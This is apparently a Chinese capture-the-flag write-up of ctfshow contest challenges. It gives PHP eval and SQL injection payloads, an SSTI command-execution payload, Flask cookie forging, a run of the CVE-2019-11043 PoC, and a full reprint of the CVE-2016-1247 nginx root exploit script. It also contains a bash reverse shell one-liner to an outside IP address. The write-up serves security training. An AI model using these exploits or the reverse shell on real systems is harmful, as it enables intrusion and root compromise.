+++
title = "ctfshow内部赛"
slug = "ctfshow-internal-competition"
description = "刷"
date = "2025-05-15T18:35:16"
lastmod = "2025-05-15T18:35:16"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["php", "ssti", "mysql"]
+++

## 签退

先做个签退热热身

```php
<?php ($S = $_GET['S'])?eval("$$S"):highlight_file(__FILE__);
```

多出来一个`$`，直接结束语句之后getshell即可

```
?S=a;phpinfo();
?S=a;system("cat ../../flag.txt");
```

## 登陆就有flag

- 长度限制为5
- 存在过滤且过滤的字符会有回显

```
mysql> select * from flag where name=''^0;
+----+------------+-------------------+
| id | name       | description       |
+----+------------+-------------------+
|  1 | alpha      | first             |
|  2 | beta       | second            |
|  3 | gamma      | third             |
|  4 | alphabet   | first-alphabet    |
|  5 | beta-gamma | second-beta-gamma |
+----+------------+-------------------+
5 rows in set (0.02 sec)
mysql> select * from flag where id=''^0;
Empty set
mysql> select * from flag where description=''^0;
+----+------------+-------------------+
| id | name       | description       |
+----+------------+-------------------+
|  1 | alpha      | first             |
|  2 | beta       | second            |
|  3 | gamma      | third             |
|  4 | alphabet   | first-alphabet    |
|  5 | beta-gamma | second-beta-gamma |
+----+------------+-------------------+
5 rows in set (0.02 sec)
```

可以发现空值去异或0，可以查出所有非数字开头的值，所以payload就很好写出来了

## 一览无余

**CVE-2019-11043**，复现一下就好了 [poc](https://github.com/neex/phuip-fpizdam)

```
git clone https://github.com/neex/phuip-fpizdam.git
cd ~/Desktop/webTools/phuip-fpizdam
go get -v && go build


go run . "http://fcbd8cce-b60d-4ff6-9278-1caa1ef8807d.challenge.ctf.show/index.php"
```

回显大概是这样，可能会有点慢

```
2025/05/15 05:49:50 Base status code is 200
2025/05/15 05:49:57 Status code 502 for qsl=1765, adding as a candidate
2025/05/15 05:50:02 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2025/05/15 05:52:07 Attack params found: --qsl 1755 --pisos 237 --skip-detect
2025/05/15 05:52:07 Trying to set "session.auto_start=0"...
2025/05/15 05:52:13 Detect() returned attack params: --qsl 1755 --pisos 237 --skip-detect <-- REMEMBER THIS
2025/05/15 05:52:13 Performing attack using php.ini settings...
2025/05/15 05:52:19 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2025/05/15 05:52:19 Trying to cleanup /tmp/a...
2025/05/15 05:52:19 Done!
```

然后RCE即可`?a=cat fl0gHe1e.txt`

## 蓝瘦

内存flag等会ENV看环境变量即可，随便登录一下，`ctfshow\ctfshow`进去之后看到有session，用工具分解一下，网站源码看到key为`ican`

```
flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6ImN0ZnNob3cifQ.aCXkxg.Sh8FMZx5gD3ivBGfkZb0RIRstGY'

flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'ican'
```

测试出来是ssti，直接打

```http
GET /?ctfshow={{7*7}} HTTP/1.1
Host: c02223f6-9a6c-41ae-99a8-61d669734dc5.challenge.ctf.show
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aCXlng.8uR6azDAknAoYBlvRRmBajQBXoo


```

```http
GET /?ctfshow={{url_for.__globals__.__builtins__['__import__']('os').popen('env').read()}} HTTP/1.1
Host: c02223f6-9a6c-41ae-99a8-61d669734dc5.challenge.ctf.show
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aCXlng.8uR6azDAknAoYBlvRRmBajQBXoo


```

## 出题人不想跟你说话.jpg

密码为`cai`，先链接木马先，权限不够需要提权，查看进程发现定时任务，查看定时任务`cat /etc/crontab`

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user    command
17 *    * * *    root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 *    * * *    root    /usr/sbin/logrotate -vf /etc/logrotate.d/nginx
```

看了一下文件权限，不能修改文件，也就是说不能定时任务提权，看系统`cat /etc/os-release`，发现是`PRETTY_NAME="Ubuntu 14.04.5 LTS"`，查找提权文章，找到[一个](https://blog.csdn.net/EC_Carrot/article/details/114597448)，但是发现我们内核版本是`5.4.0-163-generi`不满足条件，想利用**CVE-2021-3493**来提权，也失败了，问AI是说靶机是docker，但是这个洞是在的主机，最后我突然想起还有一个`nginx`的洞**CVE-2016-1247**

```sh
#!/bin/bash
#
# Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit
# nginxed-root.sh (ver. 1.0)
#
# CVE-2016-1247
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory.
#
# ---
# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu
# etc.) to escalate their privileges from nginx web server user (www-data) to root 
# through unsafe error log handling.
#
# The exploit waits for Nginx server to be restarted or receive a USR1 signal.
# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)
# script which is called daily by the cron.daily on default installations.
# The restart should take place at 6:25am which is when cron.daily executes.
# Attackers can therefore get a root shell automatically in 24h at most without any admin
# interaction just by letting the exploit run till 6:25am assuming that daily logrotation 
# has been configured. 
#
#
# Exploit usage:
# ./nginxed-root.sh path_to_nginx_error.log 
#
# To trigger logrotation for testing the exploit, you can run the following command:
#
# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
# Video PoC:
# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
#
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/nginxrootsh"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
    # Cleanup 
    echo -e "\n[+] Cleaning up..."
    rm -f $PRIVESCSRC
    rm -f $PRIVESCLIB
    rm -f $ERRORLOG
    touch $ERRORLOG
    if [ -f /etc/ld.so.preload ]; then
        echo -n > /etc/ld.so.preload
    fi
    echo -e "\n[+] Job done. Exiting with code $1 \n"
    exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
    cleanexit 0
}

#intro 

cat <<_eascii_
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
_eascii_

echo -e "\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"

# Args
if [ $# -lt 1 ]; then
    echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
    echo -e "It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
    exit 3
fi

# Priv check

echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
id | grep -q www-data
if [ $? -ne 0 ]; then
    echo -e "\n[!] You need to execute the exploit as www-data user! Exiting.\n"
    exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f $ERRORLOG ]; then
    echo -e "\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\n"
    exit 3
fi

# [ Exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
    static uid_t  (*old_geteuid)();
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
    if ( old_geteuid() == 0 ) {
        chown("$BACKDOORPATH", 0, 0);
        chmod("$BACKDOORPATH", 04777);
        unlink("/etc/ld.so.preload");
    }
    return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
    echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
    cleanexit 2;
fi


# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
    echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
    exit 2
fi

# Symlink the log file
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
    echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
    cleanexit 3
fi
echo -e "\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"

# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered
curl http://localhost/ >/dev/null 2>/dev/null
# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily 
# rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)
echo -ne "\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am..."
while :; do 
    sleep 1
    if [ -f /etc/ld.so.preload ]; then
        echo $PRIVESCLIB > /etc/ld.so.preload
        rm -f $ERRORLOG
        break;
    fi
done

# /etc/ld.so.preload should be owned by www-data user at this point
# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo 2>/dev/null >/dev/null

# Check for the rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
    echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
    echo -e "\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m"
else
    echo -e "\n[!] Failed to get root"
    cleanexit 2
fi

rm -f $ERRORLOG
echo > $ERRORLOG

# Use the rootshell to perform cleanup that requires root privilges
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
# Reset the logging to error.log
$BACKDOORPATH -p -c "kill -USR1 `pidof -s nginx`"

# Execute the rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -i

# Job done.
cleanexit 0
```

有个细节，就是必须要在Linux里面创建sh文件，不然会报错，然后运行poc即可

```
chmod +x nginx.sh
./nginx.sh
./nginx.sh /var/log/nginx/error.log
```

没有成功，反弹shell再来执行看看会不会变化

```
bash -i >& /dev/tcp/156.238.233.93/9999 0>&1
```

等一分钟漏洞重新触发就是root权限了

## 签到

`www.zip`拿到源码

```php
<?php
function check($arr){
if(preg_match("/load|and|or|\||\&|select|union|\'|=| |\\\|,|sleep|ascii/i",$arr)){
			echo "<script>alert('bad hacker!')</script>";
           die();   
       }
else{
	return true;
}
}
session_start();
include('db.php');
if(isset($_POST['e'])&&isset($_POST['p']))
{
$e=$_POST['e'];
$p=$_POST['p'];
$sql ="select username from test1 where email='$e' and password='$p'";
if(check($e)&&check($p)){
$result=mysqli_query($con,$sql);
$row = mysqli_fetch_assoc($result);
    if($row){ 
		$_SESSION['u']=$row['username'];
		header('location:user.php');
    }
	else {
		echo "<script>alert('Wrong username or password')</script>";
	}
}
}
 
?>
```

```php
<?php
function check($arr){
if(preg_match("/load|and|\||\&| |\\\|sleep|ascii|if/i",$arr)){
			echo "<script>alert('bad hacker!')</script>";
           die();   
       }
else{
	return true;
}
}

include('db.php');
if(isset($_POST['e'])&&isset($_POST['u'])&&isset($_POST['p']))
{
$e=$_POST['e'];
$u=$_POST['u'];
$p=$_POST['p'];
$sql =
"insert into test1
set email = '$e', 
username = '$u',
password = '$p'
";
if(check($e)&&check($u)&&check($p)){
if(mysqli_query($con, $sql))
{
header('location:login.php');
}
}
}
 
?>
```

```php
<html>
<body background="bg2.jpg">
</body>
</html>
<?php
include('db.php');
session_start();
error_reporting(0);
if($_SESSION['u']){
$username=$_SESSION['u'];

if (is_numeric($username))
	{	
		if(strlen($username)>10) {
			$username=substr($username,0,10);
		}
		echo "Hello $username,there's nothing here but dog food!";
	}
	else{
		echo "<script>alert('The username can only be a number.How did you get here?go out!!!');location.href='login.php';</script>";
}
}
else{
		echo "<script>alert('Login first!');location.href='login.php';</script>";
}
?>

```

没有预编译，并且可以看到`register.php`的waf明显不够强，所以可以去打二次注入，username要满足是数字，可以用hex函数转一下，insert注入，直接打即可，不过有个细节就是不能覆盖数据，所以我们写脚本，把数字写大点

```python
import requests
import re

url = "http://76c86834-e9fb-493c-93ad-bb295d703ee0.challenge.ctf.show/"

flag = ''
for i in range(1, 100):
    # payload = "hex(hex(substr((select/**/flag/**/from/**/flag)from/**/" + str(i) + "/**/for/**/1))),/*"
    payload = "hex(hex(substr((select/**/flag/**/from/**/flag),{0},1))),".format(i)
    # print(payload)
    s = requests.session()
    data1 = {
        'e': str(i+30) + "',username=" + payload,
        'u': "#",
        'p': i+30
    }
    # print(data1['e'])
    r1 = s.post(url=url+"register.php", data=data1)
    data2 = {
        'e': i+30,
        'p': i+30
    }
    r2 = s.post(url=url+"login.php", data=data2)
    t = r2.text
    real = re.findall("Hello (.*?),", t)[0]
    flag += real
    print(flag)

```



